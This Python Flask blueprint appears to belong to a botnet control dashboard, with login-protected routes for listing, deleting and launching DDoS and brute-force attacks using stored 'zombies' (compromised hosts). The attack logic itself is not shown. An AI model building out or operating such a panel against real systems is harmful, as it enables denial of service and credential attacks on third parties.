#!/usr/bin/env python
# -*- coding: utf-8 -*-
# r3nt0n


from flask import Blueprint, current_app, render_template, request

attacks_bp = Blueprint('attacks_bp', __name__)


from app import logger, zession
from app.modules import DataFilter, AttackController
from app.modules.crud import read_data, delete_data
from app.forms import CreateDDosAttackForm

from .custom_decorators import login_required

zession.current_section = 'tools'
data_type = 'tasks'

tasks_deleted = []

@attacks_bp.before_request
def before_request_func():
    global tasks_deleted
    #tasks_deleted = []
    # delete tasks
    if (request.method == 'POST') and ('btn-delete-tasks' in request.form):
        selected_tasks = request.form.getlist('tasks_checked')
        for id in selected_tasks:
            if delete_data('task', id):
                tasks_deleted.append(id)



@attacks_bp.route('/attacks/', methods=['GET', 'POST'])
@login_required
def attacks():
    # filter data
    data_filter = DataFilter(data_type)
    if ('filter_btn' in request.form) or ('btn-delete-tasks' in request.form):
        data_filter.run(request)

    return render_template("pages/dashboard/tools/attacks.html", zession=zession,
                           data_type=data_type, data_filter=data_filter, attacks_deleted=tasks_deleted)


@attacks_bp.route('/ddos-attacks/', methods=['GET', 'POST'])
@login_required
def ddos_attacks():
    # filter data
    data_filter = DataFilter(data_type)
    if ('filter_btn' in request.form) or ('btn-delete-tasks' in request.form):
        data_filter.run(request)

    task_type = 'ddos_attacks'
    # create attack
    create_attack = AttackController('dos')
    create_attack.form = CreateDDosAttackForm()
    if (request.method == 'POST') and ('create_btn' in request.form):
        create_attack.run(request)

    return render_template("pages/dashboard/tools/ddos-attacks.html", zession=zession,
                           data_filter=data_filter, attacks_deleted=tasks_deleted,
                           create_attack=create_attack, task_type=task_type)



@attacks_bp.route('/brute-attacks/', methods=['GET', 'POST'])
@login_required
def brute_attacks():
    zession.current_section = 'tools'
    data_type = 'brute_attacks'
    filter_error = create_error = None
    create_attack = False

    # filter data
    data_filter = DataFilter(data_type)
    if ('filter_btn' in request.form):
        data_filter.run(request)

    # launch attack creator
    create_attack_form = False
    if (request.method == 'POST') and ('btn-launcher' in request.form):
        zombies_data = read_data('zombies')
        create_attack = True

    # create new attack
    if (request.method == 'POST') and ('btn-ddos-creator' in request.form):
        print(request.form)
        pass
        # ...
        # data = get_filtered_data_by_input(request, 'zombies')
        # return render_template("pages/dashboard/tools/ddos-creator.html", zession=zession, create_error=error, data=data)

    return render_template("pages/dashboard/tools/brute-attacks.html",
                           zession=zession, filter_form=data_filter.form, filter_error=data_filter.error,
                           data=data_filter.data, create_error=create_error, create_attack=create_attack,
                           create_attack_form=create_attack_form)